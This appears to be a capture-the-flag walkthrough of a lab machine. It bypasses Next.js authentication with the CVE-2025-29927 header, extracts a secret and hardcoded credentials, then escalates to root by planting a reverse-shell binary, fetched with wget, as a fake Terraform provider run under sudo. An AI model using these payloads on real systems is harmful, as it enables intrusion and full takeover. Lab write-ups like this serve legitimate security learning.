![[IMG-20260211174810501.png]]
## User Flag

### [CVE-2025-29927](https://github.com/lirantal/vulnerable-nextjs-14-CVE-2025-29927)

![[IMG-20260211174810621.png]]

![[IMG-20260211174810742.png]]
USE:
```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

![[IMG-20260211174810908.png]]

![[IMG-20260211174811174.png]]

![[IMG-20260211174811963.png]]

![[IMG-20260211174812420.png]]



![[IMG-20260211174812905.png]]

![[IMG-20260211174813205.png]]

```
NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```

### [Doc Next Auth](https://next-auth.js.org/getting-started/example)

![[IMG-20260211174813457.png]]

```
  pages/api/auth/[...nextauth].js
```

![[IMG-20260211174813732.png]]

```js
let o = {
        session: { strategy: "jwt" },
        providers: [
          r.n(CredentialsProvider)()({
            name: "Credentials",
            credentials: {
              username: { label: "User", type: "username" },
              password: { label: "Password", type: "password" }
            },
            authorize: async e =>
              e?.username === "jeremy" &&
              e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
                ? { id: "1", name: "Jeremy" }
                : null
          })
        ],
        pages: { signIn: "/signin" },
        secret: process.env.NEXTAUTH_SECRET
      };
```


```
user: jeremy
password: MyNameIsJeremyAndILovePancakes
```

![[IMG-20260211174814438.png]]

## Root Flag

### Analyse

![[IMG-20260123023128826.png]]

![[IMG-20260123023129356.png]]

### Exploit

[Doc Terraform](https://developer.hashicorp.com/terraform/cli/config/environment-variables)

![[IMG-20260123023129689.png]]

Load a config file custom.

![[IMG-20260123023129949.png]]

### Attacker machine

```bash
gcc main.c -o terraform-provider-examples
python3 -m http.server 8000
nc -lvnp 4444
```

main.c:
```c
#include <unistd.h>
int main() {
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.141/4444 0>&1", NULL);
    return 0;
}

```

### Victim machine

```bash
wget http://10.10.14.141:8000/terraform-provider-examples
chmod +x terraform-provider-examples
sudo /usr/bin/terraform -chdir\=/opt/examples apply
```
Look at [[Linux/Privilege Escalation|Privilege Escalation]] for more details

![[IMG-20260123023130205.png]]

![[IMG-20260123023130475.png]]


![[IMG-20260123023031797.png]]


